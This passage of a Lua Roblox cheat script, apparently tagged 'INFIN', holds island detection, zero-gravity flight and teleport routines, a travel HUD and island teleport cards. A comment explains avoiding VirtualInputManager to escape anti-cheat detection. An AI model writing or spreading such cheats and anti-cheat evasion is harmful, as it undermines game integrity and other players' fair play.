        for _, d in ipairs(workspace:GetDescendants()) do
            if (d:IsA("Model") or d:IsA("Folder")) and d.Name:lower():find("island", 1, true)
            and not (tf and d:IsDescendantOf(tf)) then
                local inside, a = false, d.Parent
                while a and a ~= workspace do
                    if seen[a] then inside = true break end
                    a = a.Parent
                end
                if not inside and not d.Name:lower():find("islands", 1, true) then
                    seen[d] = true
                    table.insert(out, d)
                end
            end
        end
    end
    return out
end

-- bounding box of an island (folders included); cached
function Isle.box(inst)
    local c = Isle.bounds[inst]
    if c and inst.Parent then return c.cf, c.size end
    local cf, size
    if inst:IsA("Model") then
        local ok, a, b = pcall(inst.GetBoundingBox, inst)
        if ok then cf, size = a, b end
    elseif inst:IsA("BasePart") then
        cf, size = inst.CFrame, inst.Size
    end
    if not cf then
        local mn, mx
        for _, p in ipairs(inst:GetDescendants()) do
            if p:IsA("BasePart") then
                local h = p.Size / 2
                local lo, hi = p.Position - h, p.Position + h
                mn = mn and Vector3.new(math.min(mn.X, lo.X), math.min(mn.Y, lo.Y), math.min(mn.Z, lo.Z)) or lo
                mx = mx and Vector3.new(math.max(mx.X, hi.X), math.max(mx.Y, hi.Y), math.max(mx.Z, hi.Z)) or hi
            end
        end
        if mn then cf, size = CFrame.new((mn + mx) / 2), mx - mn end
    end
    if cf then Isle.bounds[inst] = { cf = cf, size = size } end
    return cf, size
end

-- real island name: attributes / values / sign text, else a cleaned-up model name
local NAME_KEYS = { "DisplayName", "IslandName", "AreaName", "ZoneName", "Title" }
-- island names from the game's own data modules (ReplicatedStorage)
function Isle.dataNames()
    if Isle._names then return Isle._names end
    local map = {}
    local function norm(x) return tostring(x):lower():gsub("[%s_%-]", "") end
    for _, m in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if m:IsA("ModuleScript") then
            local n = m.Name:lower()
            if (n:find("island") or n:find("area") or n:find("world") or n:find("zone") or n:find("location"))
            and not n:find("controller") and not n:find("service") then
                local ok, data = pcall(require, m)
                if ok and type(data) == "table" then
                    for k, v in pairs(data) do
                        if type(v) == "table" then
                            local dn = rawget(v, "DisplayName") or rawget(v, "Name") or rawget(v, "Title") or rawget(v, "IslandName")
                            if type(dn) == "string" and dn ~= "" then
                                map[norm(k)] = dn
                                local id = rawget(v, "Id") or rawget(v, "ModelName") or rawget(v, "Model")
                                if type(id) == "string" then map[norm(id)] = dn end
                            end
                        end
                    end
                end
            end
        end
    end
    Isle._names = map
    return map
end

function Isle.name(inst)
    if Isle.nameCache and Isle.nameCache[inst] then return Isle.nameCache[inst] end
    local n = Isle.rawName(inst)
    Isle.nameCache = Isle.nameCache or setmetatable({}, { __mode = "k" })
    Isle.nameCache[inst] = n
    return n
end

function Isle.rawName(inst)
    local key = inst.Name:lower():gsub("[%s_%-]", "")
    local dn = Isle.dataNames()[key]
    if dn then return dn end
    for _, k in ipairs(NAME_KEYS) do
        local v = inst:GetAttribute(k)
        if type(v) == "string" and v ~= "" then return v end
        local sv = inst:FindFirstChild(k)
        if sv and sv:IsA("StringValue") and sv.Value ~= "" then return sv.Value end
    end
    for _, g in ipairs(inst:GetDescendants()) do
        if g:IsA("TextLabel") then
            local nm = g.Name:lower()
            local holder = (g:FindFirstAncestorWhichIsA("LayerCollector") or g).Name:lower()
            if nm:find("name", 1, true) or nm:find("title", 1, true)
            or holder:find("name", 1, true) or holder:find("title", 1, true) or holder:find("sign", 1, true) then
                local t = ((g.ContentText ~= "" and g.ContentText) or g.Text or ""):gsub("<[^>]->", "")
                t = t:match("^%s*(.-)%s*$")
                if t ~= "" and #t <= 32 and t:find("%a") then return t end
            end
        end
    end
    local n = inst.Name:gsub("_", " "):gsub("(%l)(%u)", "%1 %2"):gsub("(%a)(%d)", "%1 %2")
    return n
end

-- the trampoline in the middle of the map (not one of the base trampolines)
-- center trampoline: your saved pick > named center/main/middle/hub > the one in the
-- middle of all the base trampolines + islands (bases sit around the hub)
local CENTER_WORDS = { "center", "centre", "middle", "main", "hub", "spawn", "big", "giant", "global", "public" }

function Isle.trampCands()
    local tf = Tramp.folder()
    local cands, set = {}, {}
    for _, d in ipairs(workspace:GetDescendants()) do
        if (d:IsA("Model") or d:IsA("BasePart")) and d.Name:lower():find("trampoline", 1, true)
        and not (tf and d:IsDescendantOf(tf)) and not d:IsDescendantOf(player.Character or W.gui) then
            local inside, a = false, d.Parent
            while a and a ~= workspace do
                if set[a] then inside = true break end
                a = a.Parent
            end
            if not inside then set[d] = true table.insert(cands, d) end
        end
    end
    return cands, set
end

function Isle.centerTramp(islands)
    if S.centerPick and S.centerPick.Parent then return S.centerPick end
    if Isle.ct and Isle.ct.Parent then return Isle.ct end
    local cands = Isle.trampCands()
    if #cands == 0 then return nil end

    for _, t in ipairs(cands) do
        local n = (t.Name .. " " .. (t.Parent and t.Parent.Name or "")):lower()
        for _, w in ipairs(CENTER_WORDS) do
            if n:find(w, 1, true) then Isle.ct = t return t end
        end
    end

    local center, n = Vector3.zero, 0
    local tf = Tramp.folder()
    for _, b in ipairs(tf and tf:GetChildren() or {}) do
        local p = Tramp.pos(b)
        if p then center += p n += 1 end
    end
    for _, isl in ipairs(islands or {}) do
        local cf = Isle.box(isl)
        if cf then center += cf.Position n += 1 end
    end
    center = n > 0 and center / n or Vector3.zero

    local best, bd
    for _, t in ipairs(cands) do
        local p = Tramp.pos(t)
        local d = p and (Vector3.new(p.X, 0, p.Z) - Vector3.new(center.X, 0, center.Z)).Magnitude
        if d and (not bd or d < bd) then best, bd = t, d end
    end
    Isle.ct = best
    return best
end

-- Settings > SET: the trampoline you're standing on becomes the center trampoline
function Isle.pickStanding()
    local ch = player.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude
    rp.FilterDescendantsInstances = { ch }
    local hit = workspace:Raycast(hrp.Position, Vector3.new(0, -12, 0), rp)
    local a = hit and hit.Instance
    while a and a ~= workspace do
        if a.Name:lower():find("trampoline", 1, true) and not (a.Parent and a.Parent.Name:lower():find("trampoline", 1, true)) then
            S.centerPick = a
            Isle.ct = a
            return a
        end
        a = a.Parent
    end
    return nil
end

-- ---------- collision-safe flight ----------
-- every frame the next step is swept with a sphere the size of your character,
-- so you can never be moved into or through the map. If a leg is blocked the
-- route is re-planned from where you are (higher / through an open gap).
local flyRay = RaycastParams.new()
flyRay.FilterType = Enum.RaycastFilterType.Exclude
flyRay.RespectCanCollide = true

local SWEEP_R = 3            -- sphere radius swept along every move
-- (no VirtualInputManager: calling GetService on it creates a new service under
--  game, which anti-cheats watch for — that's what got you kicked on load)

-- true if a sphere moving a -> b would hit something solid
local function blocked(a, b)
    local dir = b - a
    if dir.Magnitude < 0.05 then return false end
    local ok, hit = pcall(function() return workspace:Spherecast(a, SWEEP_R, dir, flyRay) end)
    if ok then
        if hit then return true end
    else
        -- no Spherecast support: fan of rays around the path
        local side = dir:Cross(Vector3.yAxis)
        side = side.Magnitude > 0.01 and side.Unit * SWEEP_R or Vector3.new(SWEEP_R, 0, 0)
        local up = Vector3.new(0, SWEEP_R, 0)
        for _, off in ipairs({ Vector3.zero, side, -side, up, -up }) do
            if workspace:Raycast(a + off, dir, flyRay) then return true end
        end
    end
    return false
end

-- open vertical column near p from height y0 up to alt (ring search)
local function openColumn(p, y0, alt)
    local radii = { 0, 12, 24, 40, 60, 90, 130, 180, 240, 320, 420 }
    for _, r in ipairs(radii) do
        local steps = r == 0 and 1 or 12
        for k = 0, steps - 1 do
            local a = (k / steps) * math.pi * 2
            local q = Vector3.new(p.X + math.cos(a) * r, y0, p.Z + math.sin(a) * r)
            local top = Vector3.new(q.X, alt, q.Z)
            if not blocked(p, q) and not blocked(q, top) then return q, top end
        end
    end
    return nil
end

-- ground on the island under (x, z) + standing height
local function landingAt(x, z, fromY, lift, isl)
    local hit = workspace:Raycast(Vector3.new(x, fromY, z), Vector3.new(0, -(fromY + 2000), 0), flyRay)
    if not hit then return nil end
    -- ground that belongs to the island (or terrain / parts sitting inside its box)
    local inIsland = not isl or hit.Instance == isl or hit.Instance:IsDescendantOf(isl)
    if not inIsland and Isle.bounds[isl] then
        local b = Isle.bounds[isl]
        inIsland = hit.Position.Y >= b.cf.Position.Y - b.size.Y / 2 - 5
            and hit.Position.Y <= b.cf.Position.Y + b.size.Y / 2 + 5
    end
    return inIsland and (hit.Position + Vector3.new(0, lift, 0)) or nil
end

-- plan: up -> across -> down, with open-column fallbacks at both ends
-- plan: up -> across -> down, with open-column fallbacks at both ends
-- target = { inst, cf, size, minR, maxR }
function Isle.plan(from, target, lift, minAlt)
    local cf, size, isl = target.cf, target.size, target.inst
    local topY = cf.Position.Y + size.Y / 2
    local base = math.max(from.Y, topY, minAlt or -math.huge) + 25
    local minR = target.minR or 0
    local maxR = target.maxR or math.max(size.X, size.Z) / 2

    for alt = base, base + 900, 30 do
        local land, landTop
        for r = minR, math.max(minR, maxR), 8 do
            local steps = r == 0 and 1 or 10
            for k = 0, steps - 1 do
                local a = (k / steps) * math.pi * 2
                local x, z = cf.X + math.cos(a) * r, cf.Z + math.sin(a) * r
                local l = landingAt(x, z, alt, lift, isl)
                if l and not blocked(Vector3.new(x, alt, z), l) then
                    land, landTop = l, Vector3.new(x, alt, z)
                    break
                end
            end
            if land then break end
        end

        if land then
            local up = Vector3.new(from.X, alt, from.Z)
            local route
            if not blocked(from, up) then
                route = { up }
            else
                local q, top = openColumn(from, from.Y, alt)
                if q then route = { q, top } end
            end
            if route and not blocked(route[#route], landTop) then
                table.insert(route, landTop)
                table.insert(route, land)
                return route
            end
        end
    end
    return nil
end

-- moves the root step by step, sweeping ahead each frame; false = blocked
local function moveTo(hrp, to)
    local rot = hrp.CFrame - hrp.Position
    while hrp.Parent do
        local dt = RunService.Heartbeat:Wait()
        if Isle.cancel then return false end
        local pos = hrp.Position
        local d = to - pos
        local dist = d.Magnitude
        if dist < 0.3 then
            hrp.CFrame = CFrame.new(to) * rot
            return true
        end
        local speed = math.clamp((Isle.tripDist or 0) / 8, ISLE_SPEED, 2500)   -- long trips ~8s, short ones use FLY SPEED
        local step = math.min(dist, speed * dt)
        local dirU = d.Unit
        if blocked(pos, pos + dirU * math.min(dist, step + SWEEP_R)) then return false end
        local flat = d * Vector3.new(1, 0, 1)
        if flat.Magnitude > 0.5 then rot = CFrame.lookAt(Vector3.zero, flat.Unit) end
        hrp.CFrame = CFrame.new(pos + dirU * step) * rot
        hrp.AssemblyLinearVelocity = Vector3.zero
    end
    return false
end

-- no safe path: slide a few studs to the right (relative to the target), safely.
-- if right is walled off, try up, then left, then back.
local NUDGE = 6
function Isle.nudge(hrp, target)
    local toT = (target.cf.Position - hrp.Position) * Vector3.new(1, 0, 1)
    if toT.Magnitude < 0.1 then toT = hrp.CFrame.LookVector * Vector3.new(1, 0, 1) end
    if toT.Magnitude < 0.1 then toT = Vector3.new(0, 0, -1) end
    local fwd = toT.Unit
    local right = fwd:Cross(Vector3.yAxis)
    for _, dir in ipairs({ right, (right + Vector3.yAxis).Unit, Vector3.yAxis, -right, -fwd }) do
        local to = hrp.Position + dir * NUDGE
        if not blocked(hrp.Position, to) then
            local rot = hrp.CFrame - hrp.Position
            local tw = TweenService:Create(hrp, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                { CFrame = CFrame.new(to) * rot })
            tw:Play()
            tw.Completed:Wait()
            hrp.AssemblyLinearVelocity = Vector3.zero
            return true
        end
    end
    return false
end

-- one jump the way the game sees it (space key -> JumpRequest), fallback to the humanoid
function Isle.jump(hum, hrp)
    local vy = hrp.AssemblyLinearVelocity.Y
    hum.Jump = true
    task.wait(0.06)
    if hrp.AssemblyLinearVelocity.Y <= vy + 5 then
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end

-- ---------- travel HUD (top of the screen while flying) ----------
local Hud = {}
do
    local h = U.new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0), Position = UDim2.new(0.5, 0, 0, -80),
        Size = UDim2.fromOffset(270, 54), BackgroundColor3 = C.bg1, BorderSizePixel = 0,
        Visible = false, Parent = W.gui,
    })
    U.corner(h, 14)
    local st = U.stroke(h, C.white, 1.4, 0)
    Hud.flow = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.violetDk), ColorSequenceKeypoint.new(0.5, C.accent),
            ColorSequenceKeypoint.new(1, C.blue),
        }), Parent = st,
    })
    Hud.scale = U.new("UIScale", { Parent = h })

    -- spinner
    local ring = U.new("Frame", {
        Size = UDim2.fromOffset(30, 30), Position = UDim2.fromOffset(12, 12),
        BackgroundTransparency = 1, Parent = h,
    })
    U.round(ring)
    local rs = U.stroke(ring, C.white, 3, 0)
    Hud.spin = U.new("UIGradient", {
        Color = ColorSequence.new(C.violet, C.blue),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.6, 0.2),
            NumberSequenceKeypoint.new(0.75, 1), NumberSequenceKeypoint.new(1, 1),
        }), Parent = rs,
    })
    local logo = U.new("ImageLabel", {
        Size = UDim2.fromOffset(18, 18), Position = UDim2.fromOffset(6, 6), BackgroundTransparency = 1,
        Image = LOGO_ID, ScaleType = Enum.ScaleType.Crop, Parent = ring,
    })
    U.round(logo)

    Hud.title = U.label(h, { Text = "", Font = F.bold, TextSize = 12,
        Position = UDim2.fromOffset(52, 8), Size = UDim2.new(1, -118, 0, 16) })
    local stop = U.new("TextButton", {
        Text = "STOP", Font = F.bold, TextSize = 10, TextColor3 = Color3.fromRGB(255, 176, 180),
        BackgroundColor3 = Color3.fromRGB(64, 22, 36), AutoButtonColor = false, BorderSizePixel = 0,
        Size = UDim2.fromOffset(48, 22), AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -10, 0, 8),
        Parent = h,
    })
    U.round(stop)
    U.stroke(stop, C.red, 1, 0.5)
    stop.MouseButton1Click:Connect(function() Isle.cancel = true end)
    Hud.sub = U.label(h, { Text = "", Font = F.med, TextSize = 9, TextColor3 = C.dim,
        TextTruncate = Enum.TextTruncate.AtEnd, Position = UDim2.fromOffset(52, 24), Size = UDim2.new(1, -62, 0, 12) })

    local track = U.new("Frame", {
        Size = UDim2.new(1, -64, 0, 4), Position = UDim2.fromOffset(52, 41),
        BackgroundColor3 = C.field, BorderSizePixel = 0, Parent = h,
    })
    U.round(track)
    Hud.fill = U.new("Frame", { Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = track })
    U.round(Hud.fill)
    U.grad(Hud.fill, C.violet, C.blue, 0)
    Hud.frame = h

    RunService.RenderStepped:Connect(function(dt)
        if not h.Visible then return end
        Hud.spin.Rotation = (Hud.spin.Rotation + dt * 360) % 360
        Hud.flow.Rotation = (Hud.flow.Rotation + dt * 90) % 360
    end)
end

function Hud.show(name)
    Hud.frame.Visible = true
    Hud.frame.Position = UDim2.new(0.5, 0, 0, -80)
    Hud.fill.Size = UDim2.fromScale(0, 1)
    Hud.title.Text, Hud.title.TextColor3 = "Starting...", C.white
    Hud.sub.Text = "→ " .. name
    Hud.scale.Scale = math.clamp(camera.ViewportSize.X / 700, 0.7, 1)
    TweenService:Create(Hud.frame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        { Position = UDim2.new(0.5, 0, 0, 12) }):Play()
end

function Hud.step(text, frac)
    Hud.title.Text = text
    TweenService:Create(Hud.fill, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Size = UDim2.fromScale(math.clamp(frac, 0, 1), 1) }):Play()
end

function Hud.hide(ok, text)
    Hud.title.Text = text
    Hud.title.TextColor3 = ok and C.green or C.red
    Hud.fill.Size = UDim2.fromScale(ok and 1 or Hud.fill.Size.X.Scale, 1)
    task.delay(1.2, function()
        local tw = TweenService:Create(Hud.frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = UDim2.new(0.5, 0, 0, -80) })
        tw.Completed:Connect(function() if not Isle.busy then Hud.frame.Visible = false end end)
        tw:Play()
    end)
end

-- 1) land on the center trampoline and bounce
-- 2) use your jumps: level on the XP bar = number of jumps (level 7 = 7 jumps)
-- 3) gravity 0 (held), fly on a collision-safe route, down onto the target
-- 4) gravity back on
-- target = { name, inst?, cf, size, minR?, maxR?, ignore? }
function Isle.fly(target)
    if Isle.busy then A.toast("Already flying", C.yellow) return end
    local ch = player.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum and target.cf) then A.toast("Can't reach " .. tostring(target.name), C.red) return end

    Isle.busy = true
    Isle.cancel = false
    Isle.tripDist = (target.cf.Position - hrp.Position).Magnitude
    local saved = XPM.savedGravity or workspace.Gravity   -- never "restore" the TP gravity-inf value
    local holdGravity
    flyRay.FilterDescendantsInstances = target.ignore and { ch, target.ignore } or { ch }
    Hud.show(target.name)

    local ok, err = pcall(function()
        -- 1) center trampoline
        Hud.step("Center trampoline", 0.1)
        local ct = Isle.centerTramp(Isle.last)
        if ct then
            local top = Tramp.topPos(ct)
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.CFrame = CFrame.new(top) * (hrp.CFrame - hrp.Position)
            local t0 = os.clock()
            repeat task.wait(0.05) until hum.FloorMaterial ~= Enum.Material.Air or os.clock() - t0 > 1.2
        end
        Isle.jump(hum, hrp)

        -- 2) level = jumps
        local jumps = math.clamp(math.floor(XP and XP.level or 0), 0, 60)
        for j = 1, jumps do
            Hud.step(("Jump %d / %d"):format(j, jumps), 0.15 + 0.35 * (j / jumps))
            local t0 = os.clock()
            repeat RunService.Heartbeat:Wait()
            until hrp.AssemblyLinearVelocity.Y < 6 or os.clock() - t0 > 1.5
            Isle.jump(hum, hrp)
        end
        do
            local t0 = os.clock()
            repeat RunService.Heartbeat:Wait()
            until hrp.AssemblyLinearVelocity.Y < 2 or os.clock() - t0 > 1.5
        end

        -- 3) zero gravity, held every frame
        workspace.Gravity = 0
        hrp.AssemblyLinearVelocity = Vector3.zero
        holdGravity = RunService.Heartbeat:Connect(function()
            if workspace.Gravity ~= 0 then workspace.Gravity = 0 end
        end)

        local lift = hum.HipHeight + hrp.Size.Y / 2 + 0.5
        local minAlt = hrp.Position.Y
        local arrived, nudges, replans = false, 0, 0
        while not arrived do
            if Isle.cancel then error("cancelled") end
            Hud.step(replans == 0 and "Planning route" or "Re-routing", 0.55)
            local route = Isle.plan(hrp.Position, target, lift, minAlt)
            if route then
                local clean = true
                for i, pt in ipairs(route) do
                    Hud.step(i == #route and "Landing" or "Flying", 0.55 + 0.45 * ((i - 1) / #route))
                    if not moveTo(hrp, pt) then clean = false break end
                end
                if clean then arrived = true break end
                if Isle.cancel then error("cancelled") end
                replans += 1
                minAlt = hrp.Position.Y + 20
            end
            -- no safe path yet: slide a few studs right and try again
            nudges += 1
            if nudges > 80 then error("no clear route after 80 nudges") end
            Hud.step(("Finding a gap  ·  %d"):format(nudges), 0.55)
            if not Isle.nudge(hrp, target) then task.wait(0.2) end
        end
    end)

    -- 4) gravity back on
    if holdGravity then holdGravity:Disconnect() end
    if ISLE_RESTORE then workspace.Gravity = saved end
    if hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.zero end
    Isle.busy = false

    Isle.lastTrip = { name = target.name, ok = ok, at = os.date("%H:%M:%S") }
    if ok then
        Hud.hide(true, "Arrived")
        A.toast("Arrived at " .. target.name, C.green)
    else
        local stopped = tostring(err):find("cancelled", 1, true)
        Hud.hide(false, stopped and "Stopped" or "Blocked")
        A.toast(stopped and "Trip stopped" or "Couldn't find a safe way there", stopped and C.yellow or C.red)
        warn("[INFIN] tp:", err)
    end
end

function Isle.go(isl)
    local cf, size = Isle.box(isl)
    if not cf then A.toast("Can't reach that island", C.red) return end
    Isle.fly({ name = Isle.name(isl), inst = isl, cf = cf, size = size })
end

-- eggs use the exact same trip, landing on the ground right next to the egg
A.travelToEgg = function(m)
    local ok, cf, size = pcall(m.GetBoundingBox, m)
    if not ok or not m.Parent then A.toast("That egg is gone", C.red) return end
    local rad = math.max(size.X, size.Z) / 2
    Isle.fly({
        name = m.Name, cf = cf, size = Vector3.new(size.X, size.Y, size.Z),
        minR = rad + 4, maxR = rad + 40, ignore = m,
    })
end

-- ---------- the 7 islands (exact spots + pictures) ----------
local ISLANDS = {
    { name = "Grass Island",   pos = Vector3.new(-421.425,   581.556, 49.695), img = 91227305109142,  tint = Color3.fromRGB( 96, 214, 104) },
    { name = "Desert Island",  pos = Vector3.new(-481.419,  2226.256, 91.912), img = 140562082660111, tint = Color3.fromRGB(240, 196, 102) },
    { name = "Arctic Island",  pos = Vector3.new(-392.471,  4021.604, 55.303), img = 91227305109142,  tint = Color3.fromRGB(150, 214, 255) },
    { name = "Cave Island",    pos = Vector3.new(-461.132,  6514.603, 59.278), img = 94150527927502,  tint = Color3.fromRGB(170, 150, 200) },
    { name = "Aquatic Island", pos = Vector3.new(-393.830, 10281.404, 35.164), img = 102023667192099, tint = Color3.fromRGB( 70, 210, 220) },
    { name = "Lava Island",    pos = Vector3.new(-465.420, 14218.693, 81.941), img = 117409244877056, tint = Color3.fromRGB(255, 112,  64) },
    { name = "Heaven Island",  pos = Vector3.new(-409.493, 19682.006, -5.436), img = 121505341126407, tint = Color3.fromRGB(255, 236, 160) },
}

-- decal ids -> thumbnail (loads from a decal id, unlike rbxassetid)
local function decalImage(id)
    return ("rbxthumb://type=Asset&id=%d&w=420&h=420"):format(id)
end

local function fmtStuds(n)
    if n >= 1000 then return ("%.1fK"):format(n / 1000) end
    return tostring(math.floor(n + 0.5))
end

-- fly to an island's exact spot (same trip: trampoline, jumps, gravity 0, safe route)
function Isle.goTo(info)
    Isle.fly({
        name = info.name,
        cf = CFrame.new(info.pos),
        size = Vector3.new(10, 8, 10),
        minR = 0, maxR = 30,
    })
end

local isleSec = U.section(P.islands, "ISLANDS", 1)
local isleCount = U.label(isleSec, {
    Text = "7 islands  ·  lowest to highest", Font = F.med, TextSize = 10, TextColor3 = C.dim,
    Size = UDim2.new(1, 0, 0, 14), LayoutOrder = 1,
})

function Isle.makeCard(info, i)
    local card = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 92), BackgroundColor3 = C.card, BorderSizePixel = 0,
        ClipsDescendants = true, LayoutOrder = i + 1, Parent = isleSec,
    })
    U.corner(card, 14)
    local edge = U.stroke(card, info.tint, 1.4, 0.55)

    -- picture fills the card, slowly drifting
    local pic = U.new("ImageLabel", {
        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromScale(1.15, 1.35), BackgroundTransparency = 1,
        Image = decalImage(info.img), ScaleType = Enum.ScaleType.Crop, Parent = card,
    })
    U.corner(pic, 14)
    local picScale = U.new("UIScale", { Parent = pic })

    -- dark fade so text pops, tinted with the island colour
    local shade = U.new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.black, BorderSizePixel = 0, Parent = card })
    U.corner(shade, 14)
    U.new("UIGradient", {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.05), NumberSequenceKeypoint.new(0.55, 0.35), NumberSequenceKeypoint.new(1, 0.85),
        }), Parent = shade,
    })
    local tintBar = U.new("Frame", {
        Size = UDim2.new(0, 4, 1, -24), Position = UDim2.fromOffset(10, 12),
        BackgroundColor3 = info.tint, BorderSizePixel = 0, Parent = card,
    })
    U.round(tintBar)

    -- number badge
    local num = U.new("Frame", {
        Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(22, 12),
        BackgroundColor3 = info.tint, BorderSizePixel = 0, Parent = card,
    })
    U.round(num)
    U.label(num, { Text = tostring(i), Font = Enum.Font.GothamBlack, TextSize = 11, TextColor3 = C.black,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1) })

    local nameLbl = U.label(card, {
        Text = info.name, Font = Enum.Font.GothamBlack, TextSize = 17, Position = UDim2.fromOffset(52, 12),
        Size = UDim2.new(1, -140, 0, 22), TextStrokeColor3 = C.black, TextStrokeTransparency = 0.5,
        TextTruncate = Enum.TextTruncate.AtEnd,
    })
    local heightLbl = U.label(card, {
        Text = "▲ " .. fmtStuds(info.pos.Y) .. " studs up", Font = F.bold, TextSize = 10, TextColor3 = info.tint,
        Position = UDim2.fromOffset(22, 42), Size = UDim2.new(1, -140, 0, 13),
        TextStrokeColor3 = C.black, TextStrokeTransparency = 0.6,
    })
    local distLbl = U.label(card, {
        Text = "", Font = F.med, TextSize = 10, TextColor3 = Color3.fromRGB(220, 214, 235),
        Position = UDim2.fromOffset(22, 58), Size = UDim2.new(1, -140, 0, 13),
        TextStrokeColor3 = C.black, TextStrokeTransparency = 0.6,
    })

    local here = U.new("Frame", {
        Size = UDim2.fromOffset(78, 18), AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -12, 0, 12),
        BackgroundColor3 = Color3.fromRGB(18, 60, 38), BorderSizePixel = 0, Visible = false, Parent = card,
    })
    U.round(here)
    U.stroke(here, C.green, 1, 0.3)
    U.label(here, { Text = "YOU'RE HERE", Font = F.bold, TextSize = 8, TextColor3 = C.green,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1) })

    -- big TP button
    local tp = U.new("TextButton", {
        Text = "", AutoButtonColor = false, BackgroundTransparency = 1, ClipsDescendants = true,
        Size = UDim2.fromOffset(74, 32), AnchorPoint = Vector2.new(1, 1), Position = UDim2.new(1, -12, 1, -12),
        Parent = card,
    })
    local tf = U.new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = tp })
    U.round(tf)
    U.grad(tf, C.violet, C.blue, 0)
    U.stroke(tf, C.white, 1, 0.6)
    U.label(tp, { Text = "TP", Font = Enum.Font.GothamBlack, TextSize = 13, TextColor3 = C.white, ZIndex = 2,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1),
        TextStrokeColor3 = C.black, TextStrokeTransparency = 0.7 })
    local tpScale = U.new("UIScale", { Parent = tp })
    tp.MouseButton1Click:Connect(function()
        U.ripple(tp)
        tpScale.Scale = 0.9
        TweenService:Create(tpScale, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
        task.spawn(Isle.goTo, info)
    end)

    -- hover: picture zooms, border lights up
    card.MouseEnter:Connect(function()
        TweenService:Create(picScale, TweenInfo.new(0.3, Enum.EasingStyle.Quart), { Scale = 1.08 }):Play()
        TweenService:Create(edge, TweenInfo.new(0.2), { Transparency = 0 }):Play()
    end)
    card.MouseLeave:Connect(function()
        TweenService:Create(picScale, TweenInfo.new(0.3, Enum.EasingStyle.Quart), { Scale = 1 }):Play()
        TweenService:Create(edge, TweenInfo.new(0.3), { Transparency = 0.55 }):Play()
    end)

    U.popIn(card, 0.05 * i)
    return { frame = card, dist = distLbl, here = here, pic = pic, phase = i * 0.9, info = info, edge = edge }
end

for i, info in ipairs(ISLANDS) do
    Isle.rows[info] = Isle.makeCard(info, i)
end

-- which island you're on: nearest one by height, close enough sideways
function Isle.current()
    local ch = player.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local best, bd
    for _, info in ipairs(ISLANDS) do
        local dy = math.abs(hrp.Position.Y - info.pos.Y)
        local flat = (Vector3.new(hrp.Position.X, 0, hrp.Position.Z) - Vector3.new(info.pos.X, 0, info.pos.Z)).Magnitude
        if dy < 250 and flat < 600 and (not bd or dy < bd) then best, bd = info, dy end
    end
    return best
end

-- LIVE: distance + "you're here" + gentle picture drift (only while the tab is open)

RunService.RenderStepped:Connect(function()
    if S.page ~= "islands" or not S.winOpen then return end
    local t = os.clock()
    for _, row in pairs(Isle.rows) do
        row.pic.Position = UDim2.new(0.5 + math.sin(t * 0.3 + row.phase) * 0.03, 0, 0.5 + math.cos(t * 0.25 + row.phase) * 0.04, 0)
    end
end)

-- ============================================================
-- XP BAR DETECTOR (top of the Auto Farm page)
-- ============================================================
XP = { level = nil, cur = nil, max = nil }

do
    local BAR_W, BAR_H = 360, 38

    local holder = U.new("Frame", {
        Name = "XPBar", Size = UDim2.new(1, 0, 0, BAR_H), BackgroundTransparency = 1,
        LayoutOrder = 0, Parent = P.farm,
    })

    -- glow behind
    local glow = U.new("Frame", {
        Size = UDim2.new(1, 4, 1, 4), Position = UDim2.fromOffset(-2, -2),
        BackgroundColor3 = C.violet, BackgroundTransparency = 0.85, BorderSizePixel = 0, Parent = holder,
    })
    U.round(glow)
    XP.glow = glow

    local body = U.new("Frame", {
        Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.bg1, BorderSizePixel = 0,
        ClipsDescendants = true, Parent = holder,
    })
    U.round(body)
    U.grad(body, Color3.fromRGB(30, 22, 52), C.bg0, 90)
    local edge = U.stroke(body, C.white, 1.6, 0)
    XP.edgeGrad = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.violetDk), ColorSequenceKeypoint.new(0.5, C.accent),
            ColorSequenceKeypoint.new(1, C.blue),
        }),
        Parent = edge,
    })

    -- progress track + fill
    local track = U.new("Frame", {
        Size = UDim2.new(1, -52, 1, -12), Position = UDim2.fromOffset(44, 6),
        BackgroundColor3 = C.field, BorderSizePixel = 0, ClipsDescendants = true, Parent = body,
    })
    U.round(track)
    XP.fill = U.new("Frame", {
        Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = track,
    })
    U.round(XP.fill)
    U.grad(XP.fill, C.violet, C.blue, 0)

    -- moving shine across the fill
